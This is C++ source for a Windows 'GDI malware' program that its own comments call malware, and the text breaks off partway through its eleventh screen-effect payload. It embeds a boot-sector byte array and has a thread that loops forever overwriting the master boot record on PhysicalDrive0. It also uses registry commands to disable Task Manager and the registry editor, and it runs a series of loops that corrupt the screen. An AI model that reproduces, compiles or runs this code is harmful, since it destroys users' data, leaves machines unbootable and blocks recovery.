#include <windows.h>
#include <tchar.h>
#include <ctime>
#include <iostream>
#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"Msimg32.lib")
#include <math.h>
#include <time.h>
#define M_PI   3.14159265358979323846264338327950288
#define RGBBRUSH (DWORD)0x1900ac010e
#define SRCBSH (DWORD)0x89345c
#define SquareWave(t, freq, sampleCount) (((BYTE)(2.f * (FLOAT)(freq) * ((t) / (FLOAT)(sampleCount))) % 2) == 0 ? 1.f : -1.f)
#define TriangleWave(t, freq, sampleCount) (4.f * ( FLOAT )fabs(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq))) - floor(((FLOAT)(t) / ((FLOAT)(sampleCount) / (FLOAT)(freq)))) - .5f) - 1.f)
#define CUSRGB(r, g, b) (r | g << 8 | g << 16)
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef union _RGBQUAD {
	COLORREF rgb;
	struct {
		BYTE r;
		BYTE g;
		BYTE b;
		BYTE Reserved;
	};
}_RGBQUAD, * PRGBQUAD;
typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT l;
} HSL;

namespace Colors
{
	//These HSL functions was made by Wipet, credits to him!
	//OBS: I used it in 3 payloads

	//Btw ArTicZera created HSV functions, but it sucks unfortunatelly
	//So I didn't used in this malware.

	HSL rgb2hsl(RGBQUAD rgb)
	{
		HSL hsl;

		BYTE r = rgb.rgbRed;
		BYTE g = rgb.rgbGreen;
		BYTE b = rgb.rgbBlue;

		FLOAT _r = (FLOAT)r / 255.f;
		FLOAT _g = (FLOAT)g / 255.f;
		FLOAT _b = (FLOAT)b / 255.f;

		FLOAT rgbMin = min(min(_r, _g), _b);
		FLOAT rgbMax = max(max(_r, _g), _b);

		FLOAT fDelta = rgbMax - rgbMin;
		FLOAT deltaR;
		FLOAT deltaG;
		FLOAT deltaB;

		FLOAT h = 0.f;
		FLOAT s = 0.f;
		FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);

		if (fDelta != 0.f)
		{
			s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
			deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
			deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);

			if (_r == rgbMax)      h = deltaB - deltaG;
			else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
			else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
			if (h < 0.f)           h += 1.f;
			if (h > 1.f)           h -= 1.f;
		}

		hsl.h = h;
		hsl.s = s;
		hsl.l = l;
		return hsl;
	}

	RGBQUAD hsl2rgb(HSL hsl)
	{
		RGBQUAD rgb;

		FLOAT r = hsl.l;
		FLOAT g = hsl.l;
		FLOAT b = hsl.l;

		FLOAT h = hsl.h;
		FLOAT sl = hsl.s;
		FLOAT l = hsl.l;
		FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);

		FLOAT m;
		FLOAT sv;
		FLOAT fract;
		FLOAT vsf;
		FLOAT mid1;
		FLOAT mid2;

		INT sextant;

		if (v > 0.f)
		{
			m = l + l - v;
			sv = (v - m) / v;
			h *= 6.f;
			sextant = (INT)h;
			fract = h - sextant;
			vsf = v * sv * fract;
			mid1 = m + vsf;
			mid2 = v - vsf;

			switch (sextant)
			{
			case 0:
				r = v;
				g = mid1;
				b = m;
				break;
			case 1:
				r = mid2;
				g = v;
				b = m;
				break;
			case 2:
				r = m;
				g = v;
				b = mid1;
				break;
			case 3:
				r = m;
				g = mid2;
				b = v;
				break;
			case 4:
				r = mid1;
				g = m;
				b = v;
				break;
			case 5:
				r = v;
				g = m;
				b = mid2;
				break;
			}
		}

		rgb.rgbRed = (BYTE)(r * 255.f);
		rgb.rgbGreen = (BYTE)(g * 255.f);
		rgb.rgbBlue = (BYTE)(b * 255.f);

		return rgb;
	}
}
int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) { //Credits to Void_/GetMBR
	if (red != length) {
		red < length; red++;
		if (ifblue == true) {
			return RGB(red, 0, length);
		}
		else {
			return RGB(red, 0, 0);
		}
	}
	else {
		if (green != length) {
			green < length; green++;
			return RGB(length, green, 0);
		}
		else {
			if (blue != length) {
				blue < length; blue++;
				return RGB(0, length, blue);
			}
			else {
				red = 0; green = 0; blue = 0;
				ifblue = true;
			}
		}
	}
}
const unsigned char MasterBootRecord[] = { 0xB8, 0x13, 0x00, 0xCD, 0x10, 0xFC, 0xB8, 0x00, 0xA0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBE, 0xC1, 0x7D,
0xBF, 0x20, 0x14, 0x2E, 0xAD, 0x91, 0xBB, 0xF0, 0x00, 0xD1, 0xE1, 0xB8, 0x18, 0x37, 0x73, 0x03,
0xB8, 0x38, 0x02, 0xE8, 0x22, 0x00, 0x01, 0xDF, 0x83, 0xEB, 0x10, 0x72, 0x4F, 0xE8, 0x18, 0x00,
0x29, 0xDF, 0x83, 0xEF, 0x08, 0xEB, 0xE2, 0xAD, 0x97, 0xAD, 0x84, 0xE4, 0x93, 0xB0, 0x30, 0x50,
0xC6, 0x44, 0xFF, 0x02, 0xE8, 0xAE, 0x00, 0x58, 0x50, 0x53, 0x51, 0x57, 0x50, 0xBB, 0x79, 0x7D,
0x2E, 0xD7, 0x93, 0xB9, 0x08, 0x00, 0x88, 0xF8, 0xD0, 0xE3, 0x72, 0x02, 0x31, 0xC0, 0x80, 0xFF,
0x10, 0x72, 0x07, 0x80, 0x3D, 0x0E, 0x74, 0x98, 0x32, 0x05, 0xAA, 0xE2, 0xE9, 0x81, 0xC7, 0x38,
0x01, 0x58, 0x40, 0xA8, 0x07, 0x75, 0xD5, 0x5F, 0x59, 0x5B, 0x58, 0xC3, 0x81, 0xC7, 0x88, 0x09,
0x81, 0xFE, 0xEB, 0x7D, 0x75, 0x8D, 0xB1, 0x05, 0xB8, 0x02, 0x00, 0x2E, 0xA5, 0xAB, 0xE2, 0xFB,
0xB4, 0x00, 0xCD, 0x1A, 0x3B, 0x16, 0x04, 0xFA, 0x74, 0xF6, 0x89, 0x16, 0x04, 0xFA, 0xB4, 0x01,
0xCD, 0x16, 0xB4, 0x00, 0x74, 0x02, 0xCD, 0x16, 0x88, 0xE0, 0x3C, 0x01, 0x75, 0x02, 0xCD, 0x20,
0x2C, 0x48, 0x72, 0x0C, 0x3C, 0x09, 0x73, 0x08, 0xBB, 0xF5, 0x7D, 0x2E, 0xD7, 0xA2, 0xFE, 0xF9,
0xBE, 0x20, 0xE6, 0xAD, 0x97, 0xAD, 0x93, 0x31, 0xC0, 0xE8, 0x2B, 0x00, 0x80, 0x36, 0xFF, 0xF9,
0x80, 0xB8, 0x28, 0x0E, 0x78, 0x07, 0xA0, 0x22, 0xE6, 0xB1, 0x03, 0xD2, 0xE0, 0xE8, 0x68, 0xFF,
0xBD, 0x37, 0x7C, 0xB7, 0x21, 0xFF, 0xD5, 0xB7, 0x2E, 0xFF, 0xD5, 0xB7, 0x28, 0xFF, 0xD5, 0xB7,
0x34, 0xFF, 0xD5, 0xEB, 0x9B, 0x74, 0x03, 0xE8, 0x4E, 0xFF, 0x89, 0xF8, 0x31, 0xD2, 0xB9, 0x40,
0x01, 0xF7, 0xF1, 0x88, 0xD4, 0x08, 0xC4, 0x80, 0xE4, 0x07, 0x75, 0x5A, 0xB5, 0x37, 0x38, 0x6D,
0xFF, 0x10, 0xE4, 0x38, 0xAD, 0x00, 0x0A, 0x10, 0xE4, 0x38, 0x6D, 0x08, 0x10, 0xE4, 0x38, 0xAD,
0xC0, 0xFE, 0x10, 0xE4, 0x84, 0xFF, 0x74, 0x2B, 0xF6, 0xC3, 0x05, 0x74, 0x0C, 0x3B, 0x16, 0x00,
0xFA, 0xB0, 0x02, 0x72, 0x0C, 0xB0, 0x08, 0xEB, 0x08, 0x3C, 0x00, 0xB0, 0x04, 0x72, 0x02, 0xB0,
0x01, 0x84, 0xC4, 0x75, 0x23, 0x88, 0xD8, 0x84, 0xC4, 0x75, 0x1D, 0xD0, 0xE8, 0x75, 0xF8, 0xB0,
0x08, 0xEB, 0xF4, 0x89, 0x16, 0x00, 0xFA, 0x2E, 0xA2, 0x3A, 0x7D, 0xA0, 0xFE, 0xF9, 0x84, 0xC4,
0x75, 0x06, 0x20, 0xDC, 0x74, 0x1A, 0x88, 0xD8, 0x88, 0x44, 0xFE, 0xA8, 0x05, 0xBB, 0x80, 0xFD,
0x75, 0x03, 0xBB, 0x02, 0x00, 0xA8, 0x0C, 0x74, 0x02, 0xF7, 0xDB, 0x01, 0xDF, 0x89, 0x7C, 0xFC,
0xC3, 0x00, 0x42, 0xE7, 0xE7, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xFC, 0xF0, 0xF0, 0xFC, 0x7E,
0x3C, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3C, 0x7E, 0xFF, 0xFF, 0xE7, 0xE7, 0x42,
0x00, 0x3C, 0x7E, 0xFF, 0xFF, 0xFF, 0xFF, 0x7E, 0x3C, 0x3C, 0x7E, 0xDB, 0xDB, 0xFF, 0xFF, 0xFF,
0xA5, 0x00, 0x00, 0x00, 0x18, 0x18, 0x00, 0x00, 0x00, 0x3C, 0x7E, 0x3F, 0x0F, 0x0F, 0x3F, 0x7E,
0x3C, 0x00, 0x00, 0xFE, 0x7F, 0x02, 0x42, 0x02, 0x42, 0xFF, 0x7F, 0x40, 0x42, 0x7E, 0x7E, 0x02,
0x02, 0x7F, 0x02, 0xC0, 0x03, 0x40, 0x02, 0x7F, 0x02, 0x40, 0x02, 0xFE, 0x7F, 0x02, 0x42, 0xFF,
0x7B, 0x40, 0x0A, 0x7E, 0x7E, 0x02, 0x40, 0xFF, 0x7F, 0x00, 0x00, 0x98, 0xAA, 0x90, 0x50, 0x98,
0x64, 0xA0, 0x3C, 0xA8, 0x50, 0x01, 0x00, 0x00, 0x08, 0x00, 0x02, 0x00, 0x00, 0x04, 0x55, 0xAA
};
//mbr from wigofellium.exe , cuz I don't have more ideas for mbr's

DWORD WINAPI Disable(LPVOID lpParam) {
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f");
	return 1;
}
DWORD WINAPI mbr(LPVOID lpParam) {
	while (1) {
		DWORD dwBytesWritten;
		HANDLE hDevice = CreateFileW(
			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
			OPEN_EXISTING, 0, 0);

		WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
		CloseHandle(hDevice);
	}
}
DWORD WINAPI payload1 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = (Yii + Xii - i_0 / w * (i_0 % w)) / 500;
			rgbScreen[i_0].b &= code;
			rgbScreen[i_0].rgb ^= code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload2 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = ((i_0 / w * (i_0 % w)) * (Xii - Yii)) / 500;
			rgbScreen[i_0].b &= code;
			rgbScreen[i_0].rgb -= code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload3 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 1;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = ((i_0 / w * (i_0 % w)) ^ (Xii - Yii)) % 999;
			rgbScreen[i_0].b &= code;
			rgbScreen[i_0].rgb += code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload4 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+88h] [rbp+8h] BYREF
	int code; // [rsp+90h] [rbp+10h]
	INT Yii; // [rsp+94h] [rbp+14h]
	INT Xii; // [rsp+98h] [rbp+18h]
	INT y; // [rsp+9Ch] [rbp+1Ch]
	INT x; // [rsp+A0h] [rbp+20h]
	int i; // [rsp+A4h] [rbp+24h]
	HBITMAP hbmTemp; // [rsp+A8h] [rbp+28h]
	INT h; // [rsp+B0h] [rbp+30h]
	INT w; // [rsp+B4h] [rbp+34h]
	HDC hdcMem; // [rsp+B8h] [rbp+38h]
	HDC hdcScreen; // [rsp+C0h] [rbp+40h]
	INT i_0; // [rsp+CCh] [rbp+4Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	i = 9;
	while (1)
	{
		hdcScreen = GetDC(0i64);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, 0x330008u);
		for (i_0 = 0; h * w > i_0; ++i_0)
		{
			x = i_0 % w;
			y = i_0 / w;
			Xii = i_0 % w * (i_0 % w);
			Yii = i_0 / w * (i_0 / w);
			code = ((i_0 / w * (i_0 % w)) ^ (Xii - Yii)) / 999;
			rgbScreen[i_0].b &= code;
			rgbScreen[i_0].rgb += code;
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload5 (LPVOID lpParam) {
	BITMAPINFO bmi; // [rsp+50h] [rbp-30h] BYREF
	PRGBQUAD rgbScreen; // [rsp+80h] [rbp+0h] BYREF
	INT p; // [rsp+8Ch] [rbp+Ch]
	INT y; // [rsp+90h] [rbp+10h]
	INT x; // [rsp+94h] [rbp+14h]
	HBITMAP hbmTemp; // [rsp+98h] [rbp+18h]
	INT h; // [rsp+A0h] [rbp+20h]
	INT w; // [rsp+A4h] [rbp+24h]
	HDC hdcMem; // [rsp+A8h] [rbp+28h]
	HDC hdcScreen; // [rsp+B0h] [rbp+30h]
	INT i; // [rsp+BCh] [rbp+3Ch]

	hdcScreen = GetDC(0i64);
	hdcMem = CreateCompatibleDC(hdcScreen);
	w = GetSystemMetrics(0);
	h = GetSystemMetrics(1);
	memset(&bmi, 0, sizeof(bmi));
	rgbScreen = 0i64;
	bmi.bmiHeader.biSize = 44;
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	hbmTemp = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&rgbScreen, 0i64, 0);
	SelectObject(hdcMem, hbmTemp);
	while (1)
	{
		hdcScreen = GetDC(0i64);
		StretchBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, 0, 0, 0xCC0020u);
		for (i = 0; h * w > i; ++i)
		{
			x = i % w;
			y = i / w;
			p = w & i;
			rgbScreen[i].rgb += (i % w) * ((w & i) ^ (w & i) - i / w);
		}
		BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, 0xCC0020u);
		ReleaseDC(0i64, hdcScreen);
		DeleteDC(hdcScreen);
	}
}
DWORD WINAPI payload6 (LPVOID lpParam) {
	HBITMAP h; // [rsp+60h] [rbp-30h]
	HDC hdcSrc; // [rsp+68h] [rbp-28h]
	HDC hdc; // [rsp+70h] [rbp-20h]
	void* lpvBits; // [rsp+78h] [rbp-18h]
	int nHeight; // [rsp+80h] [rbp-10h]
	int nWidth; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]

	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 3)
	{
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		for (j = 0; nHeight * nWidth > j; ++j)
			*((DWORD*)lpvBits + j) -= (j / nWidth * (j / nWidth) + j) * (j % nWidth * (j % nWidth) + j);
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload7 (LPVOID lpParam) {
	HBITMAP h; // [rsp+60h] [rbp-30h]
	HDC hdcSrc; // [rsp+68h] [rbp-28h]
	HDC hdc; // [rsp+70h] [rbp-20h]
	void* lpvBits; // [rsp+78h] [rbp-18h]
	int nHeight; // [rsp+80h] [rbp-10h]
	int nWidth; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]

	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 3)
	{
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		for (j = 0; nHeight * nWidth > j; ++j)
			*((DWORD*)lpvBits + j) += (j / nWidth * (j / nWidth) - j) ^ (j % nWidth * (j % nWidth) + j);
		SetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload8 (LPVOID lpParam) {
	HBITMAP h; // [rsp+60h] [rbp-30h]
	HDC hdcSrc; // [rsp+68h] [rbp-28h]
	HDC hdc; // [rsp+70h] [rbp-20h]
	void* lpvBits; // [rsp+78h] [rbp-18h]
	int nHeight; // [rsp+80h] [rbp-10h]
	int nWidth; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]

	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 3)
	{
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		for (j = 0; nHeight * nWidth > j; ++j)
			*((DWORD*)lpvBits + j) += (j / nWidth * (j / nWidth) ^ j) ^ (j % nWidth * (j % nWidth) + j);
		SetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload9 (LPVOID lpParam) {
	HBITMAP h; // [rsp+60h] [rbp-30h]
	HDC hdcSrc; // [rsp+68h] [rbp-28h]
	HDC hdc; // [rsp+70h] [rbp-20h]
	void* lpvBits; // [rsp+78h] [rbp-18h]
	int nHeight; // [rsp+80h] [rbp-10h]
	int nWidth; // [rsp+84h] [rbp-Ch]
	int j; // [rsp+88h] [rbp-8h]
	int i; // [rsp+8Ch] [rbp-4h]

	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0i64, 4i64 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 3)
	{
		hdc = GetDC(0i64);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xCC0020u);
		GetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		for (j = 0; nHeight * nWidth > j; ++j)
			*((DWORD*)lpvBits + j) += (j / nWidth * (j / nWidth) | j) ^ (j % nWidth * (j % nWidth) + j);
		SetBitmapBits(h, 99 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, 0xCC0020u);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
	}
}
DWORD WINAPI payload10 (LPVOID lpParam) {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
	SystemMetrics = GetSystemMetrics(0);
	cy = GetSystemMetrics(1);
	memset(&pbmi, 0, sizeof(pbmi));
	ppvBits = 0i64;
	pbmi.bmiHeader.biSize = 44;
	pbmi.bmiHeader.biBitCount = 32;
	pbmi.bmiHeader.biPlanes = 1;
	pbmi.bmiHeader.biWidth = SystemMetrics;
	pbmi.bmiHeader.biHeight = cy;
	h = CreateDIBSection(hdc, &pbmi, 0, &ppvBits, 0i64, 0);
	SelectObject(hdcSrc, h);
	while (1)
	{
		hdc = GetDC(0i64);
		BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, hdc, 0, 0, 0x330008u);
		for (i = 0; cy * SystemMetrics > i; ++i)
		{
			v5 = i % SystemMetrics;
			v4 = i / SystemMetrics;
			v3 = (i % cy) | (i / SystemMetrics);
			*((DWORD*)ppvBits + i) += (i / SystemMetrics * (i / SystemMetrics)) * (i % SystemMetrics * (i % SystemMetrics));
		}
		BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0x330008u);
		ReleaseDC(0i64, hdc);
		DeleteDC(hdc);
	}
}
DWORD WINAPI payload11 (LPVOID lpParam) {
	BITMAPINFO pbmi; // [rsp+50h] [rbp-30h] BYREF
	void* ppvBits; // [rsp+80h] [rbp+0h] BYREF
	int v3; // [rsp+8Ch] [rbp+Ch]
	int v4; // [rsp+90h] [rbp+10h]
	int v5; // [rsp+94h] [rbp+14h]
	HGDIOBJ h; // [rsp+98h] [rbp+18h]
	int cy; // [rsp+A0h] [rbp+20h]
	int SystemMetrics; // [rsp+A4h] [rbp+24h]
	HDC hdcSrc; // [rsp+A8h] [rbp+28h]
	HDC hdc; // [rsp+B0h] [rbp+30h]
	int i; // [rsp+BCh] [rbp+3Ch]

	hdc = GetDC(0i64);
	hdcSrc = CreateCompatibleDC(hdc);
